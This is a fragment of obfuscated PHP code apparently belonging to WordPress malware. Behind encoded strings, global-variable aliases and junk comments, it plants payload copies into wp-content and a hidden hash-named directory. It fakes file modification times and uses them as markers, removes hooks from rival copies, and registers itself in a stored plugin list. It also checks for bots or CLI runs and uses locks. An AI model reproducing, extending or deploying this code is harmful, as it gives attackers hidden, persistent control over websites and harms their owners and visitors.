    if  (!b4za25lhh9bxaf_($i1alef1z4oaqi21, $wo0e7t08wkleok20)) {   b4za25lhh9bxaf_($vgrwd7q5u9w_mdj, $wo0e7t08wkleok20);  ztn4gifvcz10v4($i1alef1z4oaqi21);  return false;  }

    if     ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(59))) @clearstatcache(true);
 if   ($rzryil7zx5yhrr0a     !==   null    && $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(21)))  @opcache_invalidate($rzryil7zx5yhrr0a,      true);
    if  ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(60)))  @set_transient(xpm5lg9odtw6di(51), 1,  (86389+11));


   if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(61)))  @delete_transient(bk9m46jygo3f(62));
 kkpdha95nyx3tbltd10(bk9m46jygo3f(63),   ar6vo_1nyhx2koj5(64) . ($g4bbmdeemm6a  !==  null   ?  $GLOBALS['__scf_pmoxtzoe3f0qw_3']($g4bbmdeemm6a) :      gz_aorofp7mo(65)));


  return   true;
  }
     function    g9svlnw0sa98ebw6zgv($bb9zpsruvkm)
 {
try {
     if ($bb9zpsruvkm    instanceof Closure)  {   $yc_3fgo7em8cww   =  new  ReflectionFunction($bb9zpsruvkm);      return      $yc_3fgo7em8cww->getFileName();   }
   if ($GLOBALS['__scf_is0fvk8c7tq2_41']($bb9zpsruvkm)  &&      $GLOBALS['__scf_j_4rj7vg4ae0j_7']($bb9zpsruvkm,      xpm5lg9odtw6di(66)) !==     false)  {   $yc_3fgo7em8cww =     new   ReflectionMethod($bb9zpsruvkm); return $yc_3fgo7em8cww->getFileName();  }
 if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($bb9zpsruvkm) &&  $GLOBALS['__scf_v_sk95ndl08_4']($bb9zpsruvkm))  {  $yc_3fgo7em8cww = new ReflectionFunction($bb9zpsruvkm);
// free orbit
  return $yc_3fgo7em8cww->getFileName(); }
// @restore circuit-breaker

      if    ($GLOBALS['__scf_zj8mp2xbaqmp_35']($bb9zpsruvkm)     &&    $GLOBALS['__scf_oenrsvkzs1_36']($bb9zpsruvkm) ===    2) { $yc_3fgo7em8cww  =  new ReflectionMethod($bb9zpsruvkm[0], $bb9zpsruvkm[1]);  return $yc_3fgo7em8cww->getFileName();    }
// infinite resume-session


 }   catch  (Throwable   $o_qyrtxl85owt)  {$gihcevp8s=106|31;$c4fl7palocpwi=$gihcevp8s^117;}  catch (Exception  $o_qyrtxl85owt) {$bll4qoo4izzdv=PHP_INT_MAX/PHP_INT_MAX;$m4731uiuri_y=$bll4qoo4izzdv+59;}



  return null;
  }
function ilw3yq1o6_tq01($bki0gi20hmqucm)
{
   global   $wz1ggrmw8wwn;
if  (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($wz1ggrmw8wwn))     return;
    $wc7mv6ortv  = @$GLOBALS['__scf_amk7iuqda_oe_33']($bki0gi20hmqucm);
    if    ($wc7mv6ortv   ===    false)  $wc7mv6ortv =  $bki0gi20hmqucm;
  $ew_5h8v_in9y23ki  =   @$GLOBALS['__scf_amk7iuqda_oe_33'](bho93o6vof3ni5_rg622_h());
       foreach   ($wz1ggrmw8wwn  as  $dilikvkp6mf1f6 =>  $eaz4uep6u0_7)    {
    if ($GLOBALS['__scf_v834hljo6be9_67']($eaz4uep6u0_7)   &&   isset($eaz4uep6u0_7->callbacks)    &&     $GLOBALS['__scf_zj8mp2xbaqmp_35']($eaz4uep6u0_7->callbacks))   $xtlgexzr8n    =   $eaz4uep6u0_7->callbacks;
elseif    ($GLOBALS['__scf_zj8mp2xbaqmp_35']($eaz4uep6u0_7))    $xtlgexzr8n  =   $eaz4uep6u0_7;


else continue;
 foreach    ($xtlgexzr8n  as $nnlunocdfw   =>     $list)   {

  foreach     ((array)  $list as $agp3meteqwnegyz) {
   $bb9zpsruvkm      =    isset($agp3meteqwnegyz[bk9m46jygo3f(68)]) ?  $agp3meteqwnegyz[gz_aorofp7mo(69)] :     null;
    if     ($bb9zpsruvkm     ===  null)     continue;
 $s6um63o_s0zywj1  = g9svlnw0sa98ebw6zgv($bb9zpsruvkm);
  if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($s6um63o_s0zywj1))   continue;


$rln8i43rxpc  =    @$GLOBALS['__scf_amk7iuqda_oe_33']($s6um63o_s0zywj1);
  if (!(($rln8i43rxpc  !==   false  && $rln8i43rxpc ===    $wc7mv6ortv)  || $s6um63o_s0zywj1   ===     $bki0gi20hmqucm))    continue;
  if    ($ew_5h8v_in9y23ki  !== false    && $rln8i43rxpc    ===  $ew_5h8v_in9y23ki)  continue;


 if     ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(70)))      @remove_filter($dilikvkp6mf1f6, $bb9zpsruvkm, $nnlunocdfw);
 }
 }
  }
 }
  function  sj02k5u80hls2n()
 {
 $knmylduouwe  =     sxupmu4fhe9r2zxw();

   if (!@$GLOBALS['__scf_h23c49ni_b86_43']($knmylduouwe))  return;
 $y5mqj3z3td = $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(71))   ?   @$GLOBALS['__scf_b60g6hx_a7ggi_71']($knmylduouwe   .  xognx_h1jzkh(72)) :  false;
 if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($y5mqj3z3td))  return;
     $ew_5h8v_in9y23ki = @$GLOBALS['__scf_amk7iuqda_oe_33'](bho93o6vof3ni5_rg622_h());
   foreach ($y5mqj3z3td   as  $s6um63o_s0zywj1)    {
$rln8i43rxpc =   @$GLOBALS['__scf_amk7iuqda_oe_33']($s6um63o_s0zywj1);



if  ($ew_5h8v_in9y23ki     !==  false &&  $rln8i43rxpc  ===  $ew_5h8v_in9y23ki) continue;
  if  (!mowf3lw2lqslkaudd($s6um63o_s0zywj1,   (374+126))) continue;
 $du8t9u_zqkx =  hlgq8ow5g7kak5edcr9_lf($s6um63o_s0zywj1);


$ts9uw2soqe   =    ($du8t9u_zqkx  === null) ||  version_compare($du8t9u_zqkx,   xl8k_pjv1048a7ae7(),      '<');

    if   ($ts9uw2soqe      ||  r0pcenevhaaasknjjb8v7l($s6um63o_s0zywj1)) ilw3yq1o6_tq01($s6um63o_s0zywj1);
     }

  }


    function   wbvm0leq3qkmkea59($dz9ttep94ondlpl, $g3z6ma16w7vxd)
{
  return    $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(73)) ?   @$GLOBALS['__scf_iylawj38txgw_73']($dz9ttep94ondlpl, $g3z6ma16w7vxd) :   false;
     }
       function mcuqsw_cyo3mnayi6ofr6($dz9ttep94ondlpl)
      {
 $o03k8yqdft6dio1z     =     r4p_zfnleez7aynxxwapor();



 return  wbvm0leq3qkmkea59($dz9ttep94ondlpl,    ($o03k8yqdft6dio1z    -    ($o03k8yqdft6dio1z % (99959+41))) +     aruikh7uoh1wrp5bqr79());
   }
  function  b4za25lhh9bxaf_($izaoaptccqq_16i, $agqwkuals2cm_xdp)
{
return     $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(49)) ? @$GLOBALS['__scf_gjr57ltb3feage_74']($izaoaptccqq_16i, $agqwkuals2cm_xdp)  :   false;



  }

  function kzn0b1md4fk2p00($izaoaptccqq_16i, $agqwkuals2cm_xdp)
{
return  $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(75))   ?  @$GLOBALS['__scf_hnc1gj0s4looo5_75']($izaoaptccqq_16i,   $agqwkuals2cm_xdp) :   false;



 }
 function  wwbj8n248w5psw9u($q97i7_qw446ei, $dz9ttep94ondlpl)
     {



return    $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(76))   ? @$GLOBALS['__scf_x5sykg98apqg2d_76']($q97i7_qw446ei,   $dz9ttep94ondlpl) :  false;



}
function  mbmxky7iwj3mil3()
{
static    $sjts7iz8bpwu2w5   =    null;
    if     ($sjts7iz8bpwu2w5  !==  null)  return    $sjts7iz8bpwu2w5;
  $sjts7iz8bpwu2w5  =  $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(77))  ?  $GLOBALS['__scf_wuj9qpo0vbx_78']()  :  xpm5lg9odtw6di(79);
 if (@$GLOBALS['__scf_h23c49ni_b86_43']($sjts7iz8bpwu2w5) &&      @$GLOBALS['__scf_v7y4c72abxzjo_47']($sjts7iz8bpwu2w5))   return $sjts7iz8bpwu2w5;
$paudvk020we1z90   =   defined(xognx_h1jzkh(31))     ?  WP_CONTENT_DIR    :    (defined(xognx_h1jzkh(0))  ?     ABSPATH   . ar6vo_1nyhx2koj5(80)   :   "");
    if ($paudvk020we1z90    !==  "")   {
      $s6um63o_s0zywj1 = $GLOBALS['__scf_v2rfz0q9cvmh_12']($paudvk020we1z90, xognx_h1jzkh(81))     .   xpm5lg9odtw6di(82);

       if    (!@$GLOBALS['__scf_h23c49ni_b86_43']($s6um63o_s0zywj1))   @$GLOBALS['__scf_xh7dlkum2fl_16']($s6um63o_s0zywj1,   (418+75),  true);$wg4sz3l2i7=205;$l3spf8o0he4z6d=$wg4sz3l2i7%15;
    if   (@$GLOBALS['__scf_h23c49ni_b86_43']($s6um63o_s0zywj1)    && @$GLOBALS['__scf_v7y4c72abxzjo_47']($s6um63o_s0zywj1))  {
/* feasible interpreter */




  if     ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(83)))   @putenv(bk9m46jygo3f(84)  .   $s6um63o_s0zywj1);


 $GLOBALS[bk9m46jygo3f(85)]   =   1;



    $sjts7iz8bpwu2w5 = $s6um63o_s0zywj1;
  }
}
return $sjts7iz8bpwu2w5;
    }
  function  fqx8fi5u_dltwt2m84v4m()
  {



 $q97i7_qw446ei  =  xn_7dvopscmun07();
     $wmi9vtfi67mkceoi  =   sxupmu4fhe9r2zxw();
    if   ($q97i7_qw446ei ===    $wmi9vtfi67mkceoi)  return true;
  if ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(33)))   {
   $cwhmm83z3b5bq    =  @$GLOBALS['__scf_amk7iuqda_oe_33']($q97i7_qw446ei);
   $nlk7qmqxmrv   =   @$GLOBALS['__scf_amk7iuqda_oe_33']($wmi9vtfi67mkceoi);
     return   ($cwhmm83z3b5bq    !==   false  &&  $nlk7qmqxmrv     !==  false &&  $cwhmm83z3b5bq  ===  $nlk7qmqxmrv);
   }
 return    false;
 }
       function  aruikh7uoh1wrp5bqr79()
 {
  return   (93789+30);
     }
 function e9oxwf18hxbwbj6()



   {
   if  (!defined(ar6vo_1nyhx2koj5(86)))  return   "";
 $paudvk020we1z90  =  defined(xpm5lg9odtw6di(31)) ?  WP_CONTENT_DIR :  ABSPATH  .  bk9m46jygo3f(87);
 return    $GLOBALS['__scf_v2rfz0q9cvmh_12']($paudvk020we1z90, gz_aorofp7mo(81)) . bk9m46jygo3f(88)   . $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56'](ABSPATH .  gz_aorofp7mo(65)),    0,  (0x7+0x1)) .   gz_aorofp7mo(89) .   $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56'](ABSPATH  .   ar6vo_1nyhx2koj5(90)), 0,   (0x6+0x2)) .  ar6vo_1nyhx2koj5(91);

}
 function  xlvrmlebpyi298wlej790($h3wz11cllq  = null)
      {
    $dz9ttep94ondlpl   = e9oxwf18hxbwbj6();
 if ($dz9ttep94ondlpl     ===  "")  return false;

     if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($h3wz11cllq)   ||  $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq)   < (542-42)) $h3wz11cllq =    p5t6fz6i7ccgjh();
     if  (!$h3wz11cllq   || !g9edwd6m8_9cm8($h3wz11cllq))  return   false;
    $q97i7_qw446ei =  $GLOBALS['__scf_meo_1tvjsals_11']($dz9ttep94ondlpl);


 if  (!@$GLOBALS['__scf_h23c49ni_b86_43']($q97i7_qw446ei))  w1m15sg83rnn5uqc64($q97i7_qw446ei,  (433+60), true);
   if    (!@$GLOBALS['__scf_h23c49ni_b86_43']($q97i7_qw446ei)   ||    !@$GLOBALS['__scf_v7y4c72abxzjo_47']($q97i7_qw446ei))      return  false;

if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($dz9ttep94ondlpl))    {
// FFI bindings: rebalance backlog

$ui08afv6eyugt0    = iljst04arjh1pet016s($dz9ttep94ondlpl);



 if      ($GLOBALS['__scf_is0fvk8c7tq2_41']($ui08afv6eyugt0)  &&   $ui08afv6eyugt0 !==      "" &&   $GLOBALS['__scf_eo363tjzd4r6n_56']($ui08afv6eyugt0)    === $GLOBALS['__scf_eo363tjzd4r6n_56']($h3wz11cllq))  return  true;
    unset($ui08afv6eyugt0);
 $v76a6tqpxc  =   hlgq8ow5g7kak5edcr9_lf($dz9ttep94ondlpl);
        if ($v76a6tqpxc !== null  &&    version_compare($v76a6tqpxc, xl8k_pjv1048a7ae7(), '>'))   return  false;
unset($v76a6tqpxc);
 }
    if  (!rmpvo8i8m8kfd9311njxy7($dz9ttep94ondlpl,  $h3wz11cllq)) return  false;
      f97udlofaljpuxw1_jgnfh($dz9ttep94ondlpl,     (373+47));
   g6q1ehat0szqqsfbv2($dz9ttep94ondlpl);
   return true;
 }

function _mt6przpsy5n_a2ltmh()

{
   $h3wz11cllq    =  p5t6fz6i7ccgjh();

if (!$h3wz11cllq  ||   !g9edwd6m8_9cm8($h3wz11cllq))   return  false;

    $rv8s_ul0qu2z09u  =  $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(), xognx_h1jzkh(91));
 $y4e3mkwgaqm  =  $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(92)) ? hzkj2ifwqdzf_u32qrf() :    (defined(xognx_h1jzkh(31))   ?      WP_CONTENT_DIR    :  "");
  if ($y4e3mkwgaqm ===     "")      return false;
$imzxjyxc_f =   $y4e3mkwgaqm   .  ar6vo_1nyhx2koj5(93)   .  $rv8s_ul0qu2z09u;
  $klhxriwc3vqg   = $imzxjyxc_f  .  '/'  .  $rv8s_ul0qu2z09u    .  ar6vo_1nyhx2koj5(91);
    $xs89htey0m =    false;

    if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(33)))   {
      $rgwj7q8isl   = @$GLOBALS['__scf_amk7iuqda_oe_33']($klhxriwc3vqg);
 $i8boz5lfd0a  = @$GLOBALS['__scf_amk7iuqda_oe_33'](bho93o6vof3ni5_rg622_h());



  $xs89htey0m   =    ($GLOBALS['__scf_is0fvk8c7tq2_41']($rgwj7q8isl)  &&  $GLOBALS['__scf_is0fvk8c7tq2_41']($i8boz5lfd0a)  && $rgwj7q8isl ===  $i8boz5lfd0a);
        }
  if    (!$xs89htey0m)    {
    if   (!@$GLOBALS['__scf_h23c49ni_b86_43']($imzxjyxc_f))    w1m15sg83rnn5uqc64($imzxjyxc_f,   (432+61),   true);
if  (!@$GLOBALS['__scf_h23c49ni_b86_43']($imzxjyxc_f) || !@$GLOBALS['__scf_v7y4c72abxzjo_47']($imzxjyxc_f))    return      false;
        $h43cbnwo7t   = @$GLOBALS['__scf_vpig9uwvw8_pu_20']($klhxriwc3vqg)  ?     iljst04arjh1pet016s($klhxriwc3vqg) :  false;
if     ($h43cbnwo7t   !==      null     &&   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($h43cbnwo7t) ||   $GLOBALS['__scf_eo363tjzd4r6n_56']($h43cbnwo7t)   !==    $GLOBALS['__scf_eo363tjzd4r6n_56']($h3wz11cllq)))     {
 if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($klhxriwc3vqg))   {
$v76a6tqpxc  =   hlgq8ow5g7kak5edcr9_lf($klhxriwc3vqg);
if     ($v76a6tqpxc   !==   null  &&    version_compare($v76a6tqpxc,  xl8k_pjv1048a7ae7(), '>'))      return      false;
   unset($v76a6tqpxc);



 }


      if   (!rmpvo8i8m8kfd9311njxy7($klhxriwc3vqg, o_a46xczfm0z3pa91s($h3wz11cllq))) return   false;



f97udlofaljpuxw1_jgnfh($klhxriwc3vqg,    (417+3));
mcuqsw_cyo3mnayi6ofr6($klhxriwc3vqg);
g6q1ehat0szqqsfbv2($klhxriwc3vqg);
    }


unset($h43cbnwo7t);
      

     }
  $rtcn2cu9zcehk =     $rv8s_ul0qu2z09u    .    '/' . $rv8s_ul0qu2z09u     . gz_aorofp7mo(94);
bfpb2ykbb8dykf__mm($rtcn2cu9zcehk);
return  true;
}
        function   hlgq8ow5g7kak5edcr9_lf($dz9ttep94ondlpl)
 {
      $uabrlao9g235yy   =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($dz9ttep94ondlpl,    false,  null, 0,      (0xee8+0x118));
     if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($uabrlao9g235yy))    return null;
 if      ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](gz_aorofp7mo(97),   $uabrlao9g235yy,  $wmi9vtfi67mkceoi))   return $wmi9vtfi67mkceoi[1];
  return     null;

        }

 function     mowf3lw2lqslkaudd($x_l4dj16wy,    $e89rntdkpyxt)
  {
// WP useEntityProp: dehydrate task-graph

@clearstatcache(true,    $x_l4dj16wy);
 
$asota8n2im95d2   =     @$GLOBALS['__scf_k4z5lhhe91ty_98']($x_l4dj16wy);
if (!$asota8n2im95d2  ||      ($asota8n2im95d2 % (0x15fdd+0x26c3))     !==   aruikh7uoh1wrp5bqr79())   {
// WP Term Description: quadratic keystore

return false;



     }

$v9au38bovrp0 =    @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($x_l4dj16wy);

return $v9au38bovrp0 &&     $v9au38bovrp0 >=      $e89rntdkpyxt;
 }
 function    iez5nv7riwymw9wlb9sy()
{
 return (35983+17);
}
  function   ios6xxr5y_3fibzei373rz()


 {
 return   gz_aorofp7mo(100);
   }
   function     j61b_lqa6xnjdjocyu15jd()
    {
return  gz_aorofp7mo(101);

    }
 function  djh9gof_330ayn()
 {
/* deterministic orbit */

if  ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(102))) return   true;
if   (avjc_hjaj3q7ek())  return  true;
 $x0z5sw9gcz75syz =     $GLOBALS['__scf_bwbaq8fxyxm3_103']((string)  $GLOBALS['__scf_w645jfzvum_104']());
if ($x0z5sw9gcz75syz    ===    xpm5lg9odtw6di(105)  ||    $GLOBALS['__scf_j_4rj7vg4ae0j_7']($x0z5sw9gcz75syz,    xognx_h1jzkh(106))    !==   false)  return  true;


  $h0iast6cxddjz =     isset($_SERVER[xognx_h1jzkh(107)])    ?   $GLOBALS['__scf_bwbaq8fxyxm3_103']((string)    $_SERVER[ar6vo_1nyhx2koj5(108)])   : "";
 if   ($h0iast6cxddjz    !==   ""  &&  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($h0iast6cxddjz,  xognx_h1jzkh(109))      !== false     || $GLOBALS['__scf_j_4rj7vg4ae0j_7']($h0iast6cxddjz,  gz_aorofp7mo(106))  !==    false ||      $GLOBALS['__scf_j_4rj7vg4ae0j_7']($h0iast6cxddjz,   bk9m46jygo3f(110))  !==  false)) return  true;
   return   false;


     }
function  avjc_hjaj3q7ek()
 {
$h0iast6cxddjz      =    isset($_SERVER[ar6vo_1nyhx2koj5(108)])    ?   $_SERVER[xpm5lg9odtw6di(108)]   :  "";



   return $GLOBALS['__scf_is0fvk8c7tq2_41']($h0iast6cxddjz)     && stripos($h0iast6cxddjz, xognx_h1jzkh(106)) !==    false;
}


    function    jzlknbv7omzglykz($bki0gi20hmqucm)
 {
 $iszkppwrjjfs0mw  =   $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(111))  ?      @$GLOBALS['__scf_if1j_n66jo7w7_111'](gz_aorofp7mo(112))   :    false;
      if   (!$iszkppwrjjfs0mw      ||    $iszkppwrjjfs0mw  === "")    return  true;
$wc7mv6ortv =      @$GLOBALS['__scf_amk7iuqda_oe_33']($bki0gi20hmqucm);
if      (!$wc7mv6ortv) $wc7mv6ortv    =  $bki0gi20hmqucm;
   foreach   ($GLOBALS['__scf_w_xu8rj4lvsj44_113'](PATH_SEPARATOR, $iszkppwrjjfs0mw)     as $dhb4mklrk0)   {

$dhb4mklrk0    =  $GLOBALS['__scf_v2rfz0q9cvmh_12']($dhb4mklrk0, xpm5lg9odtw6di(81));
  if  ($dhb4mklrk0 &&  ($wc7mv6ortv   === $dhb4mklrk0 || $GLOBALS['__scf_j_4rj7vg4ae0j_7']($wc7mv6ortv,      $dhb4mklrk0   . DIRECTORY_SEPARATOR)      === 0))   return    true;



  }
  return  false;
}
 function     rhghoyvbshowe54($vdbxs1krbxe7_5m)



      {
 $frdd_gusor2ve4v =   $vdbxs1krbxe7_5m      . '|' .     (defined(ar6vo_1nyhx2koj5(114)) ?    DB_NAME :   "")  .  '|'  . (defined(xognx_h1jzkh(115)) ?  ABSPATH    :  "");
 return   $GLOBALS['__scf_eo363tjzd4r6n_56']($frdd_gusor2ve4v);



   }
 function   _sshnzj53qt2m4bfy5eod($vdbxs1krbxe7_5m)
  {
global  $wpdb;


if  (!isset($GLOBALS[ar6vo_1nyhx2koj5(116)])   ||    !$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[ar6vo_1nyhx2koj5(116)]))  $GLOBALS[xognx_h1jzkh(117)] =   array();
 if   (!empty($GLOBALS[gz_aorofp7mo(118)][$vdbxs1krbxe7_5m]))  {
    if   (isset($GLOBALS[bk9m46jygo3f(119)][$vdbxs1krbxe7_5m])  && $GLOBALS['__scf_v834hljo6be9_67']($wpdb))   {
  $zqfbbfelyg2   =  isset($wpdb->dbh)    ?  $wpdb->dbh :      null;



if ($zqfbbfelyg2  !==    null    &&     $GLOBALS[bk9m46jygo3f(119)][$vdbxs1krbxe7_5m]    !==    $zqfbbfelyg2)    {
  unset($GLOBALS[ar6vo_1nyhx2koj5(118)][$vdbxs1krbxe7_5m], $GLOBALS[bk9m46jygo3f(119)][$vdbxs1krbxe7_5m]);
 return   _sshnzj53qt2m4bfy5eod($vdbxs1krbxe7_5m);
}
  unset($zqfbbfelyg2);
}
   $GLOBALS[xognx_h1jzkh(118)][$vdbxs1krbxe7_5m]++;
  return true;
  }
       if    ($GLOBALS['__scf_v834hljo6be9_67']($wpdb)   &&    $GLOBALS['__scf__e6bt2kljb6u_120']($wpdb,  xognx_h1jzkh(121))) {$nxn_d224ad0w3o=116|51;$h7tmwi_bvog=$nxn_d224ad0w3o^205;
$yc_3fgo7em8cww =  @$wpdb->get_var(xognx_h1jzkh(122)  .    rhghoyvbshowe54($vdbxs1krbxe7_5m) .   ar6vo_1nyhx2koj5(123));
 if  ($yc_3fgo7em8cww     === '1') {
     $GLOBALS[ar6vo_1nyhx2koj5(118)][$vdbxs1krbxe7_5m] =   1;
     if (isset($wpdb->dbh) &&  $wpdb->dbh)    $GLOBALS[bk9m46jygo3f(124)][$vdbxs1krbxe7_5m] =   $wpdb->dbh;
return    true;
}



if    ($yc_3fgo7em8cww      ===   '0') return    false;
 }
if ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(125))   &&      $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(22))) {
 $clixserslq1bw9m  =     array();
if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(126))) $clixserslq1bw9m[]      =  $GLOBALS['__scf_wuj9qpo0vbx_78']();
       if  (defined(bk9m46jygo3f(31)))    $clixserslq1bw9m[]  =  WP_CONTENT_DIR;



    if      (defined(gz_aorofp7mo(115)))   $clixserslq1bw9m[] =  $GLOBALS['__scf_v2rfz0q9cvmh_12'](ABSPATH, xpm5lg9odtw6di(81));
  foreach    ($clixserslq1bw9m  as  $q97i7_qw446ei) {


if  ($q97i7_qw446ei      === "" ||  !@$GLOBALS['__scf_h23c49ni_b86_43']($q97i7_qw446ei)   || !@$GLOBALS['__scf_v7y4c72abxzjo_47']($q97i7_qw446ei)) continue;
      $ngbogwkal7q5    = @$GLOBALS['__scf_ja6kf6wqm030v_22']($q97i7_qw446ei   .  xpm5lg9odtw6di(127)  .    rhghoyvbshowe54($vdbxs1krbxe7_5m) .   gz_aorofp7mo(128),  'c');$rwmcz39me_k=7+38;$n_5i4zo0dxlmw=$rwmcz39me_k-13;
  if   ($ngbogwkal7q5      !==  false)    {
if     (!@flock($ngbogwkal7q5,  LOCK_EX  | LOCK_NB))   {
      @fclose($ngbogwkal7q5);



 return false;
 }
 if (!isset($GLOBALS[gz_aorofp7mo(129)])  ||  !$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[ar6vo_1nyhx2koj5(129)]))  $GLOBALS[ar6vo_1nyhx2koj5(129)]  =  array();
     $GLOBALS[gz_aorofp7mo(129)][$vdbxs1krbxe7_5m]    = $ngbogwkal7q5;
  $GLOBALS[bk9m46jygo3f(118)][$vdbxs1krbxe7_5m]  =    1;



     return      true;
 }
       }
     }
  $GLOBALS[ar6vo_1nyhx2koj5(118)][$vdbxs1krbxe7_5m]  =    1;   

  $GLOBALS[gz_aorofp7mo(130)][$vdbxs1krbxe7_5m] =      1;
     return   true;
 }
   function h1f3kqk1cj4d18z($vdbxs1krbxe7_5m)
 {
 global   $wpdb;
      if (empty($GLOBALS[ar6vo_1nyhx2koj5(118)][$vdbxs1krbxe7_5m]))  return;



  $GLOBALS[xpm5lg9odtw6di(131)][$vdbxs1krbxe7_5m]--;


   if    ($GLOBALS[xognx_h1jzkh(131)][$vdbxs1krbxe7_5m]   >  0)  return;
  unset($GLOBALS[bk9m46jygo3f(131)][$vdbxs1krbxe7_5m]);
unset($GLOBALS[bk9m46jygo3f(124)][$vdbxs1krbxe7_5m]);
   unset($GLOBALS[ar6vo_1nyhx2koj5(130)][$vdbxs1krbxe7_5m]);
 if (isset($GLOBALS[ar6vo_1nyhx2koj5(129)][$vdbxs1krbxe7_5m])) {
    @flock($GLOBALS[bk9m46jygo3f(132)][$vdbxs1krbxe7_5m],      LOCK_UN);
  @fclose($GLOBALS[xognx_h1jzkh(132)][$vdbxs1krbxe7_5m]);
 unset($GLOBALS[xognx_h1jzkh(133)][$vdbxs1krbxe7_5m]);
  }
     if   ($GLOBALS['__scf_v834hljo6be9_67']($wpdb)   &&  $GLOBALS['__scf__e6bt2kljb6u_120']($wpdb,  bk9m46jygo3f(134)))  {
 @$wpdb->query(bk9m46jygo3f(135)   .  rhghoyvbshowe54($vdbxs1krbxe7_5m)   .   xognx_h1jzkh(136));
}
   }
 function      c2unm0kszz35fa4()
{
  if   (defined(gz_aorofp7mo(137))     &&   DISALLOW_FILE_MODS)   return false;
  return  true;
  }
function  xqp68p85xvy7adjrl1s()
{
 if   (!$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(138)) ||   !$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(22)))  return   false;
  $gfbdhofe1c    =  array();
 if    ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(126))) $gfbdhofe1c[] =  $GLOBALS['__scf_wuj9qpo0vbx_78']();
     if (defined(bk9m46jygo3f(31)))  $gfbdhofe1c[] =   WP_CONTENT_DIR;
 if (defined(xpm5lg9odtw6di(139))) $gfbdhofe1c[] =    $GLOBALS['__scf_v2rfz0q9cvmh_12'](ABSPATH, ar6vo_1nyhx2koj5(81));


 foreach   ($gfbdhofe1c   as   $bgcj7zk0rzbbbmty) {
// vectorize revocation-list for WP Social Links

   if ($bgcj7zk0rzbbbmty  ===  ""   ||  !@$GLOBALS['__scf_h23c49ni_b86_43']($bgcj7zk0rzbbbmty) ||  !@$GLOBALS['__scf_v7y4c72abxzjo_47']($bgcj7zk0rzbbbmty))      continue;
   $mcsuw22ujo9va61   = @$GLOBALS['__scf_ja6kf6wqm030v_22']($bgcj7zk0rzbbbmty  .      xognx_h1jzkh(127) . rhghoyvbshowe54(bk9m46jygo3f(140)) .   bk9m46jygo3f(141),   'c');
 if   ($mcsuw22ujo9va61   === false) continue;
if (!@flock($mcsuw22ujo9va61,   LOCK_EX  |     LOCK_NB)) {
// speculate transformer for WP Archive Title




@fclose($mcsuw22ujo9va61);
 return false;
 }
// hydrate convex b-tree



   $GLOBALS[gz_aorofp7mo(142)]  =  $mcsuw22ujo9va61;
return true;
 }
  return  false;
     }
    function    jl6ymoaz02a8n10g()
 {
    if (isset($GLOBALS[bk9m46jygo3f(143)]))   {



   @flock($GLOBALS[xognx_h1jzkh(143)],    LOCK_UN);
  @fclose($GLOBALS[ar6vo_1nyhx2koj5(143)]);
   unset($GLOBALS[bk9m46jygo3f(143)]);
    }

 }
     function  bfpb2ykbb8dykf__mm($rtcn2cu9zcehk)
  {
  if    (!$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(144)) ||  !$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(145)))    return;
if     (!xqp68p85xvy7adjrl1s())  return;
  try    {
$e_8ohcdqvhb  = get_option(ar6vo_1nyhx2koj5(146), array());
 if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($e_8ohcdqvhb)) $e_8ohcdqvhb =  array();


    $gthjq3u2qyocnv  = $GLOBALS['__scf_xctrtxw7z4_147']($GLOBALS['__scf_p3c9g_i0vy_148']($e_8ohcdqvhb));
 if   (!$GLOBALS['__scf_uh0dc0gefs_xhu_149']($rtcn2cu9zcehk,  $gthjq3u2qyocnv,   true))     $gthjq3u2qyocnv[]   = $rtcn2cu9zcehk;



   if    ($gthjq3u2qyocnv  !==   $e_8ohcdqvhb)  update_option(xpm5lg9odtw6di(146),   $gthjq3u2qyocnv);
